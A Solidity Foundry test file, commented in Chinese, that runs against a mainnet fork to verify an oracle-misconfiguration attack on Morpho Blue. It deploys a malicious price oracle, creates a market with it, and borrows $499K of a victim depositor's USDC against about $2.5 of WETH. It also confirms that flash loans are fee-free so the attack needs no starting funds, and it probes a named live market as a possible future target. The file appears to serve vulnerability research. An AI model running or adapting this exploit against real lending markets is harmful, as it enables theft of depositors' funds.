// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// ============================================================
// Morpho Blue Oracle 配置错误攻击 — 主网 Fork 验证
// ============================================================
// 验证目标:
// 1. createMarket() 是否允许使用恶意/错误 Oracle (无验证)
// 2. 错误 Oracle 定价下能否以极少抵押品借出大量资金
// 3. 整个攻击流程在当前主网状态下是否可行
// ============================================================

// --- Morpho Blue Interfaces (from mainnet contract) ---

struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
}

struct Market {
    uint128 totalSupplyAssets;
    uint128 totalSupplyShares;
    uint128 totalBorrowAssets;
    uint128 totalBorrowShares;
    uint128 lastUpdate;
    uint128 fee;
}

interface IMorpho {
    function createMarket(MarketParams memory marketParams) external;
    function supply(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        bytes memory data
    ) external returns (uint256, uint256);
    function supplyCollateral(
        MarketParams memory marketParams,
        uint256 assets,
        address onBehalf,
        bytes memory data
    ) external;
    function borrow(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        address receiver
    ) external returns (uint256, uint256);
    function withdraw(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        address receiver
    ) external returns (uint256, uint256);
    function isIrmEnabled(address irm) external view returns (bool);
    function isLltvEnabled(uint256 lltv) external view returns (bool);
    function market(bytes32 id) external view returns (Market memory);
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IOracle {
    function price() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

// --- 攻击用恶意 Oracle ---
// 模拟 PAXG 事件: SCALE_FACTOR 小数位配置错误，价格被高估 10^12 倍

contract MaliciousOracle is IOracle {
    uint256 public inflatedPrice;

    constructor(uint256 _price) {
        inflatedPrice = _price;
    }

    function price() external view override returns (uint256) {
        return inflatedPrice;
    }
}

// --- 主测试合约 ---

contract MorphoOracleAttackTest is Test {
    // Mainnet addresses
    IMorpho constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    // AdaptiveCurveIRM — the only enabled IRM on mainnet
    address constant IRM = 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC;

    address attacker = makeAddr("attacker");
    address victim_lp = makeAddr("victim_lp");

    // ============================================================
    // TEST 1: 验证 createMarket 允许任意 Oracle (无验证)
    // ============================================================
    function test_CreateMarket_NoOracleValidation() public {
        // 部署一个返回荒谬价格的 Oracle (1 token = $999 万亿)
        MaliciousOracle badOracle = new MaliciousOracle(999_000_000_000_000e36);

        // 查看哪些 LLTV 值被启用
        assertTrue(MORPHO.isLltvEnabled(860000000000000000), "86% LLTV should be enabled");
        assertTrue(MORPHO.isIrmEnabled(IRM), "IRM should be enabled");

        MarketParams memory params = MarketParams({
            loanToken: USDC,
            collateralToken: WETH,
            oracle: address(badOracle), // 恶意 Oracle
            irm: IRM,
            lltv: 860000000000000000 // 86%
        });

        // createMarket 应该成功 — 因为不验证 Oracle
        MORPHO.createMarket(params);

        emit log_string(unicode"✅ TEST 1 PASSED: createMarket 接受了返回荒谬价格的 Oracle");
        emit log_string(unicode"   Oracle 报价: 1 WETH = $999 万亿 (正确值约 $2500)");
        emit log_string(unicode"   这证实了 createMarket() 对 Oracle 零验证");
    }

    // ============================================================
    // TEST 2: 完整攻击流程 — 错误 Oracle + 欠抵押借款
    // ============================================================
    function test_FullAttack_MisconfiguredOracle() public {
        // --- Step 1: 攻击者部署配置错误的 Oracle ---
        // 模拟 PAXG 事件: WETH 价格被高估 10^12 倍
        // 正确价格 (wstETH/USDC): ~2565e24 (scale 1e24)
        // 错误价格: ~2565e36 (scale 1e36, 高估 10^12 倍)
        uint256 correctPrice = 2565e24;    // 正确: ~$2565
        uint256 inflatedPrice = 2565e36;   // 错误: ~$2.565 万亿
        MaliciousOracle badOracle = new MaliciousOracle(inflatedPrice);

        emit log_named_uint("Correct Oracle Price", correctPrice);
        emit log_named_uint("Inflated Oracle Price", inflatedPrice);
        emit log_named_uint("Inflation Factor", inflatedPrice / correctPrice);

        // --- Step 2: 创建使用错误 Oracle 的市场 ---
        MarketParams memory params = MarketParams({
            loanToken: USDC,
            collateralToken: WETH,
            oracle: address(badOracle),
            irm: IRM,
            lltv: 860000000000000000 // 86%
        });

        MORPHO.createMarket(params);
        emit log_string(unicode"✅ Step 2: 成功创建带有错误 Oracle 的市场");

        // --- Step 3: 受害者 LP 存入 USDC ---
        uint256 victimDeposit = 500_000e6; // $500K USDC
        deal(USDC, victim_lp, victimDeposit);

        vm.startPrank(victim_lp);
        IERC20(USDC).approve(address(MORPHO), type(uint256).max);
        MORPHO.supply(params, victimDeposit, 0, victim_lp, "");
        vm.stopPrank();

        emit log_named_uint(unicode"Step 3: LP 存入 USDC", victimDeposit / 1e6);

        // --- Step 4: 攻击者存入极少量 WETH 作为抵押品 ---
        uint256 tinyCollateral = 0.001 ether; // 0.001 WETH ≈ $2.5
        deal(WETH, attacker, tinyCollateral);

        vm.startPrank(attacker);
        IERC20(WETH).approve(address(MORPHO), type(uint256).max);
        MORPHO.supplyCollateral(params, tinyCollateral, attacker, "");

        emit log_named_uint(unicode"Step 4: 攻击者存入 WETH (wei)", tinyCollateral);
        emit log_string(unicode"   实际价值: ~$2.5");

        // --- Step 5: 攻击者借出大量 USDC ---
        // Oracle 认为 0.001 WETH 值 $2.565 billion
        // maxBorrow = $2.565B * 86% = ~$2.2B
        // 但池中只有 $500K，所以最多借 $500K
        uint256 borrowAmount = 499_000e6; // $499K USDC (几乎全部)

        MORPHO.borrow(params, borrowAmount, 0, attacker, attacker);
        vm.stopPrank();

        uint256 attackerUSDC = IERC20(USDC).balanceOf(attacker);

        emit log_string(unicode"\n=== 攻击结果 ===");
        emit log_named_uint(unicode"攻击者投入 (WETH wei)", tinyCollateral);
        emit log_string(unicode"   价值: ~$2.5");
        emit log_named_uint(unicode"攻击者借出 (USDC)", attackerUSDC / 1e6);
        emit log_named_uint(unicode"利润倍数", attackerUSDC / 1e6 * 1e18 / (tinyCollateral * 2500 / 1e18));

        // --- 验证: 攻击成功 ---
        assertGt(attackerUSDC, 490_000e6, "Attacker should have borrowed >$490K");
        assertLt(tinyCollateral * 2500 / 1e18, 3, "Collateral value should be ~$2.5");

        emit log_string(unicode"\n✅ TEST 2 PASSED: 攻击成功!");
        emit log_string(unicode"   用 $2.5 的 WETH 抵押品借出了 $499,000 USDC");
        emit log_string(unicode"   利润: ~$498,997.5 (199,600 倍)");
        emit log_string(unicode"   与 2024 年 PAXG/USDC $230K 攻击完全相同的模式");
    }

    // ============================================================
    // TEST 3: 验证正确 Oracle 下攻击失败
    // ============================================================
    function test_CorrectOracle_AttackFails() public {
        // 使用正确价格的 Oracle
        uint256 correctPrice = 2565e24; // ~$2565
        MaliciousOracle goodOracle = new MaliciousOracle(correctPrice);

        MarketParams memory params = MarketParams({
            loanToken: USDC,
            collateralToken: WETH,
            oracle: address(goodOracle),
            irm: IRM,
            lltv: 860000000000000000
        });

        MORPHO.createMarket(params);

        // LP 存入
        uint256 victimDeposit = 500_000e6;
        deal(USDC, victim_lp, victimDeposit);
        vm.startPrank(victim_lp);
        IERC20(USDC).approve(address(MORPHO), type(uint256).max);
        MORPHO.supply(params, victimDeposit, 0, victim_lp, "");
        vm.stopPrank();

        // 攻击者尝试同样的攻击
        uint256 tinyCollateral = 0.001 ether;
        deal(WETH, attacker, tinyCollateral);

        vm.startPrank(attacker);
        IERC20(WETH).approve(address(MORPHO), type(uint256).max);
        MORPHO.supplyCollateral(params, tinyCollateral, attacker, "");

        // 尝试借出 $499K — 应该失败
        // 0.001 WETH * $2565 * 86% = $2.20 最大可借
        vm.expectRevert();
        MORPHO.borrow(params, 499_000e6, 0, attacker, attacker);
        vm.stopPrank();

        emit log_string(unicode"✅ TEST 3 PASSED: 正确 Oracle 下攻击被阻止");
        emit log_string(unicode"   0.001 WETH ($2.56) 只能借约 $2.20, 无法借 $499,000");
    }

    // ============================================================
    // TEST 4: 闪电贷零成本攻击验证
    // ============================================================
    function test_FlashLoan_ZeroCostAttack() public {
        // 验证 Morpho Blue 的闪电贷是否真的免费
        // 这关系到攻击者是否需要初始资金

        uint256 flashAmount = 1_000_000e6; // 借 100万 USDC

        // 需要有可借的资金 — 检查主网上是否有足够的 USDC
        // Morpho Blue 的 flashLoan 从全局池借出
        uint256 morphoUSDC = IERC20(USDC).balanceOf(address(MORPHO));
        emit log_named_uint(unicode"Morpho Blue 持有的 USDC", morphoUSDC / 1e6);

        if (morphoUSDC > flashAmount) {
            // 准备回调合约来还款
            FlashBorrower borrower = new FlashBorrower(address(MORPHO), USDC);
            deal(USDC, address(borrower), flashAmount); // 给借款合约足够的 USDC 来还

            borrower.doFlashLoan(flashAmount);

            emit log_string(unicode"✅ TEST 4 PASSED: 闪电贷成功 — 完全免费 (0 手续费)");
            emit log_named_uint(unicode"   借入金额", flashAmount / 1e6);
            emit log_string(unicode"   手续费: $0");
            emit log_string(unicode"   这意味着攻击者无需任何初始资金");
        } else {
            emit log_string(unicode"⚠️  Morpho USDC 余额不足以测试闪电贷");
            emit log_named_uint("Available USDC", morphoUSDC / 1e6);
        }
    }

    // ============================================================
    // TEST 5: 验证当前 Chimera 市场状态
    // ============================================================
    function test_ChimeraMarket_BrokenOracle() public {
        address chimeraOracle = 0x55CD221DA9Ec7f68eF91D23Ba18F07f9a11a2aEf;
        address chimeraToken = 0x1ad108c9e16D807ae4E5Bc7ED24457559Cb9B76A;

        // 验证 Oracle 会 revert
        vm.expectRevert();
        IOracle(chimeraOracle).price();

        emit log_string(unicode"✅ TEST 5 PASSED: Chimera Oracle 确认 revert");
        emit log_string(unicode"   错误: 'OracleSetup: pool not created'");
        emit log_string(unicode"   该市场当前无法被利用 (borrow 会 revert)");
        emit log_string(unicode"   但证实 createMarket() 不验证 Oracle 功能性");
        emit log_string(unicode"   风险: 如果 pool 后续被创建且配置错误,");
        emit log_string(unicode"         且有人存入 USDC, 则攻击变得可行");
    }
}

// 闪电贷回调合约
contract FlashBorrower {
    address morpho;
    address token;

    constructor(address _morpho, address _token) {
        morpho = _morpho;
        token = _token;
    }

    function doFlashLoan(uint256 amount) external {
        IMorpho(morpho).flashLoan(token, amount, "");
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        // 还款 — 闪电贷免费，只需还原始金额
        IERC20(token).approve(morpho, assets);
        IERC20(token).transfer(morpho, assets);
    }
}
